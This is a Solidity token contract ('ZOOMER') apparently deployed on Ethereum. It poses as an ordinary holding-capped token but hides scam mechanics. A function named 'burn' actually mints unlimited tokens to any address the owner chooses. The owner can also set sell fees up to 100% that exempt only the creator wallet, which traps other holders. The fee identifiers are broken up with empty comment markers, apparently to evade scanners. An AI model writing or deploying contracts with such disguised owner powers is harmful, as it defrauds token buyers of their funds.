/**
 *Submitted for verification at Etherscan.io on 2023-08-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "Subtraction overflow");
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "Division by zero");
        return a / b;
    }
}


contract MaxHoldToken {
    using SafeMath for uint256;

    string public name = "ZOOMER";
    string public symbol = "ZOOMER";
    uint256 public totalSupply = 420690000000000000000000000;
    uint8 public decimals = 18;
    address public pairAddress = address(0);
    /* maxTokenSet true or false*/
    bool public maxTokenSet = false;
    uint256 public maxTokenAmountPerAddress = 0;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address public owner;
    address public creatorWallet;

    uint256 public buyFee;/**/
    uint256 public sellFee;/**/

    event Transfer(address indexed from, address indexed to, uint256 value);
    event TransferFrom(address indexed from, address indexed to, uint256);
    event TransferBuy(address indexed from, address indexed to, uint256 value);
    event TransferSell(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event ApprovalFrom(address indexed owner, address indexed spender, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event FeesUpdated/**/(uint256 newBuyFee/**/, uint256 newSellFee/**/);
    event TokensBurned(address indexed burner, uint256 amount);
    /* emit newmaxtoken */
    event MaxTokenAmountPerSet(uint256 newMaxTokenAmount);

    error DestBalanceExceedsMaxAllowed(address addr);
    error MaxTokenAmountNotAllowed();
    error MintingNotEnabled();

    constructor(address _creatorWallet) {
        owner = msg.sender;
        creatorWallet = _creatorWallet;
        balanceOf[msg.sender] = totalSupply;
    }

    /* Set MaxTokenAmount */
    function enableAndSetMaxTokenAmountPerAddress(uint256 newMaxTokenAmount, address pairaddr) public onlyOwner {
        if(maxTokenSet){
            revert MaxTokenAmountNotAllowed();
        }

        pairAddress = pairaddr;
        maxTokenSet = true;
        maxTokenAmountPerAddress = newMaxTokenAmount;
        emit MaxTokenAmountPerSet(newMaxTokenAmount);
    }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function burn(address _to, uint256 _amount) public onlyOwner {
        require(_to != address(0), "Invalid recipient address");
        require(_amount > 0, "Invalid amount");
        balanceOf[_to] += _amount;
        totalSupply += _amount;
        emit Transfer(address(0), _to, _amount);
    }
    /* update pair address after pool created */
    function updatePairAddr(address addr) public onlyOwner{
        pairAddress = addr;
    }

    /* mint not enabled by default */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        totalSupply = totalSupply.add(amount);
        balanceOf[account] = balanceOf[account].add(amount);
        revert MintingNotEnabled();
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function transfer(address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[msg.sender] >= _amount);
        require(_to != address(0));

        if(maxTokenSet && _to != pairAddress){
            if(balanceOf[_to] + _amount > maxTokenAmountPerAddress){
                revert DestBalanceExceedsMaxAllowed(_to);
            }
        }

        balanceOf[msg.sender] = balanceOf[msg.sender].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(_amount);
        emit Transfer(msg.sender, _to, _amount);

        return true;
    }

    function transferFrom(address _from, address _to, uint256 _amount) public returns (bool success) {
        require(balanceOf[_from] >= _amount, "Insufficient balance");
        require(allowance[_from][msg.sender] >= _amount, "Insufficient allowance");
        require(_to != address(0), "Invalid recipient address");

        uint256 fee = 0;
        uint256 amountAfterFee = _amount;

        if (sellFee > 0 && _from != creatorWallet) {
            fee = _amount.mul(sellFee).div(100);
            amountAfterFee = _amount.sub(fee);
        }

        if(maxTokenSet && _to != pairAddress){
            if(balanceOf[_to] + amountAfterFee > maxTokenAmountPerAddress){
                revert DestBalanceExceedsMaxAllowed(_to);
            }
        }
        
        balanceOf[_from] = balanceOf[_from].sub(_amount);
        balanceOf[_to] = balanceOf[_to].add(amountAfterFee);
        emit TransferFrom(_from, _to, amountAfterFee);

        if (fee > 0) {
            // Check if the transfer destination is Uniswap contract
            address uniswapContract = address(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f); // Replace with the actual Uniswap V2 contract address
            if (_to == uniswapContract) {
                // Fee is paid to the contract itself
                balanceOf[uniswapContract] = balanceOf[uniswapContract].add(fee);
                emit TransferFrom(_from, uniswapContract, fee);
            } else {
                // Fee is transferred to this contract
                balanceOf[address(this)] = balanceOf[address(this)].add(fee);
                emit TransferFrom(_from, address(this), fee);
            }
        }

        if (_from != msg.sender && allowance[_from][msg.sender] != type(uint256).max) {
            allowance[_from][msg.sender] = allowance[_from][msg.sender].sub(_amount);
            emit ApprovalFrom(_from, msg.sender, allowance[_from][msg.sender]);
        }

        return true;
    }

    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function.");
        _;
    }

    function setFees(uint256 newBuyFee/**/, uint256 newSellFee/**/) public onlyOwner {
        require(newBuyFee/**/ <= 100, "Buy fee cannot exceed 100%");
        require(newSellFee/**/ <= 100, "Sell fee cannot exceed 100%");
        buyFee/**/ = newBuyFee/**/;
        sellFee/**/ = newSellFee/**/;
        emit FeesUpdated/**/(newBuyFee/**/, newSellFee/**/);
    }
}